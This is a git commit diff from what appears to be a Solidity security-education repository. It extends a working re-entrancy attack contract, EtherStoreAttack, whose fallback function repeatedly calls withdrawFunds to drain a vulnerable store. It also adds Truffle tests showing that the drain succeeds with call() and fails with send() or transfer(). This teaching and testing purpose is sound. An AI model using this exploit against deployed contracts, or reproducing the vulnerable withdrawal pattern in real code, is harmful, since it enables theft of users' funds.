50f12e6d38508fea76c2817ae22365f71462241a
Rodrigo Q. Saramago <rodrigoqsaramago@gmail.com>
2020-10-22 15:20:29 +0200

    Allow tests for the 3 possible ways of transferring ether and re-entrancy attack

--- solidity/security/contracts/EtherStoreAttack.sol
+++ solidity/security/contracts/EtherStoreAttack.sol
@@ -5,19 +5,21 @@ import "./EtherStore.sol";
 
 contract EtherStoreAttack {
     EtherStore public etherStore;
+    EtherStore.WTYPE wtype;
 
     // intialize the etherStore variable with the contract address
     function setEtherStoreAddress(address _etherStoreAddress) public {
         etherStore = EtherStore(_etherStoreAddress);
     }
 
-    function attackEtherStore() public payable {
+    function attackEtherStore(EtherStore.WTYPE _wt) public payable {
         // attack to the nearest ether
         require(msg.value >= 1 ether);
         // send eth to the depositFunds() function
         etherStore.depositFunds.value(1 ether)();
         // start the magic
-        etherStore.withdrawFunds(1 ether);
+        wtype = _wt;
+        etherStore.withdrawFunds(_wt, 1 ether);
     }
 
     function collectEther() public {
@@ -27,7 +29,7 @@ contract EtherStoreAttack {
     // fallback function - where the magic happens
     function() external payable {
         if (address(etherStore).balance >= 1 ether) {
-            etherStore.withdrawFunds(1 ether);
+            etherStore.withdrawFunds(wtype, 1 ether);
         }
     }
 }
--- solidity/security/test/reentrance.js
+++ solidity/security/test/reentrance.js
@@ -1,8 +1,15 @@
+const { BN, expectRevert } = require('@openzeppelin/test-helpers');
+const { assertion } = require('@openzeppelin/test-helpers/src/expectRevert');
+
 const EtherStore = artifacts.require("EtherStore");
 const EtherStoreAttack = artifacts.require("EtherStoreAttack");
 
+const WTYPE_CALL = new BN(0);
+const WTYPE_SEND = new BN(1);
+const WTYPE_TRANSFER = new BN(2);
+
 contract("EtherStoreAttack", () => {
-    before(async () => {
+    beforeEach(async () => {
         this.accounts = await web3.eth.getAccounts();
         this.es = await EtherStore.new();
         this.esa = await EtherStoreAttack.new();
@@ -14,9 +21,36 @@ contract("EtherStoreAttack", () => {
         // deposit 5 ether from account 2
         await this.es.depositFunds({ "from": this.accounts[2], "value": web3.utils.toWei("5") });
     });
-    it("carry out attack", async () => {
-        await this.esa.attackEtherStore({ "from": this.accounts[3], "value": web3.utils.toWei("1") });
-        await web3.eth.getBalance(this.es.address).then(async balance => this.esbalance = await web3.utils.fromWei(balance));
-        assert.equal(this.esbalance, 0);
+    it("revert due to failed transfer", async () => {
+
+        await expectRevert.unspecified(this.esa.attackEtherStore(WTYPE_TRANSFER, { "from": this.accounts[3], "value": web3.utils.toWei("1") }));
+
+        esBalance = web3.utils.fromWei(await web3.eth.getBalance(this.es.address));
+        assert.equal(esBalance, 10);
+
+        attackerBalance = web3.utils.fromWei(await web3.eth.getBalance(this.esa.address));
+        assert.equal(attackerBalance, 0);
+    });
+
+    it("does not successfully withdraw due to failed send", async () => {
+        await this.esa.attackEtherStore(WTYPE_SEND, { "from": this.accounts[3], "value": web3.utils.toWei("1") });
+
+        // But the initial deposit performed by the attacker by calling
+        // `attackEtherStore` still succeed.
+        esBalance = web3.utils.fromWei(await web3.eth.getBalance(this.es.address));
+        assert.equal(esBalance, 11);
+
+        attackerBalance = web3.utils.fromWei(await web3.eth.getBalance(this.esa.address));
+        assert.equal(attackerBalance, 0);
+    });
+
+    it("successfully withdraw all funds in the contract due to the re-entrancy attack", async () => {
+        await this.esa.attackEtherStore(WTYPE_CALL, { "from": this.accounts[3], "value": web3.utils.toWei("1") });
+
+        esBalance = web3.utils.fromWei(await web3.eth.getBalance(this.es.address));
+        assert.equal(esBalance, 0);
+
+        attackerBalance = web3.utils.fromWei(await web3.eth.getBalance(this.esa.address));
+        assert.equal(attackerBalance, 11);
     });
 });
